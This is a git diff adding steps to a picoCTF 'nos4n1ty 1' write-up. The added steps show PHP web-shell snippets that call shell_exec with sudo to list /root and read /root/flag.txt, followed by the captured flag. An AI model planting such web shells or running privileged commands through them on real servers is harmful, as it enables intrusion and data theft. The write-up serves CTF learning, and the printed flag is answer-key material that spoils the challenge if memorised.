@@ -1,4 +1,4 @@
-<h1>nos4n1ty 1</h1>
+![image](https://github.com/user-attachments/assets/d419866d-6107-475a-ab0c-0fae5d35fdf1)<h1>nos4n1ty 1</h1>
 
 From: https://play.picoctf.org/practice/challenge/482
 
@@ -99,7 +99,42 @@ However, this returns a blank page, how interesting...
 with only specify the / directory, I can see the file structure for the machine:
 ![image](https://github.com/user-attachments/assets/543f62ec-0f89-440f-86e3-709b57bde680)
 
-When sending the this command with `ls -la` command, we can see the priviliges for the different directories, notice that root 
+When sending the this command with `ls -la` command, we can see the priviliges for the different directories, notice that root doesn't have many permissions
+![image](https://github.com/user-attachments/assets/0ab4744a-1bcb-47c5-8a48-59bdd525466e)
+
+from: https://linuxhandbook.com/linux-file-permissions/ this means that only an administrator can view this directory:
+![image](https://github.com/user-attachments/assets/eb1aabfa-1dc3-4636-9a92-c1d7aeb56c61)
+
+modifying the code to be:
+```
+<?php
+$output = shell_exec('sudo ls /root -l');
+echo "<pre>$output</pre>";
+?>
+```
+- returns:
+![image](https://github.com/user-attachments/assets/22230c0f-b698-485f-9790-7de542fb6364)
+
+Cool! we can see the flag!
+
+lets try the same shell code, but cat the file directly with the full path.
+```
+<?php
+$output = shell_exec('sudo cat /root/flag.txt');
+echo "<pre>$output</pre>";
+?>
+```
+returns:
+![image](https://github.com/user-attachments/assets/72047e65-403e-4cd0-bc23-2453883970c7)
+
+__`picoCTF{wh47_c4n_u_d0_wPHP_d698d800}`__
+
+Whoopee!
+
+
+
+
+
 
 
 
